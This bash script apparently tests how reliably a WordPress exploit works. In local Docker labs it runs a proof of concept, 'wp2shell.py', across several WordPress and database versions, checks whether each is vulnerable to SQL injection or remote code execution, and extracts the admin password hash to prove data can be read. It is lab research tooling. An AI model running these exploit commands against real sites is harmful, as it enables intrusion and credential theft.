#!/usr/bin/env bash
# Reliability matrix for wp2shell.py: stand up each (WordPress version, DB engine)
# combo, run the PoC, record the verdict, tear the combo down. Sequential, one
# port, clean throwaway stacks. Usage: lab/matrix.sh
set -u
HERE="$(cd "$(dirname "$0")/.." && pwd)"
COMPOSE="$HERE/lab/docker-compose.matrix.yml"
PROJ="wp2shell-matrix"
PORT="${PORT:-8080}"
POC="$HERE/wp2shell.py"
OUT="${TMPDIR:-/tmp}/wp2shell-matrix"
mkdir -p "$OUT"
SUMMARY="$OUT/summary.txt"; : > "$SUMMARY"

# combos: "label|WP_IMAGE|DB_IMAGE|class"   class: full = RCE chain, sqli = SQLi-only range
COMBOS=(
  "6.9.4 + MariaDB 11|wordpress:6.9.4-apache|mariadb:11|full"
  "7.0.1 + MariaDB 11|wordpress:7.0.1-apache|mariadb:11|full"
  "6.8.3 + MariaDB 11|wordpress:6.8.3-apache|mariadb:11|sqli"
  "6.9.4 + MySQL 8.4|wordpress:6.9.4-apache|mysql:8.4|full"
)

compose() { docker compose -f "$COMPOSE" -p "$PROJ" "$@"; }

teardown() { compose down -v >/dev/null 2>&1; }

wait_ready() {
  for _ in $(seq 1 80); do
    compose logs wpcli 2>/dev/null | grep -q "LAB READY" && return 0
    sleep 3
  done
  return 1
}

echo "== wp2shell reliability matrix =="
teardown
for combo in "${COMBOS[@]}"; do
  IFS='|' read -r LABEL WP_IMAGE DB_IMAGE CLASS <<<"$combo"
  echo
  echo "########################################################################"
  echo "# $LABEL   ($WP_IMAGE on $DB_IMAGE)"
  echo "########################################################################"
  export LAB_PROJECT="$PROJ" WP_IMAGE DB_IMAGE PORT
  teardown
  compose up -d >/dev/null 2>&1
  if ! wait_ready; then
    echo "  [!] lab did not reach READY"; compose logs wpcli 2>/dev/null | tail -5
    echo "$LABEL | SETUP-FAILED" >>"$SUMMARY"; teardown; continue
  fi
  ver_line="$(compose logs wpcli 2>/dev/null | grep 'WordPress' | tail -1 | sed 's/.*| //')"
  echo "  $ver_line"

  base="http://localhost:$PORT"
  chk="$OUT/check_$(echo "$LABEL" | tr ' +.' '___').txt"
  python3 "$POC" check "$base" --sleep 3 >"$chk" 2>&1
  chk_rc=$?
  sed 's/^/    /' "$chk"

  verdict="check_rc=$chk_rc"
  if [ "$chk_rc" -eq 0 ]; then
    # prove data read on this engine/version
    hash_line="$(python3 "$POC" read "$base" --preset users 2>/dev/null | grep -E '\|admin\|' | head -1 | sed 's/^\[+\] //')"
    echo "    users -> ${hash_line:-<none>}"
    verdict="$verdict extract=${hash_line:+OK}"
  fi
  echo "$LABEL | $verdict" >>"$SUMMARY"
  teardown
done

echo
echo "======================== MATRIX SUMMARY ========================"
cat "$SUMMARY"
echo "================================================================"
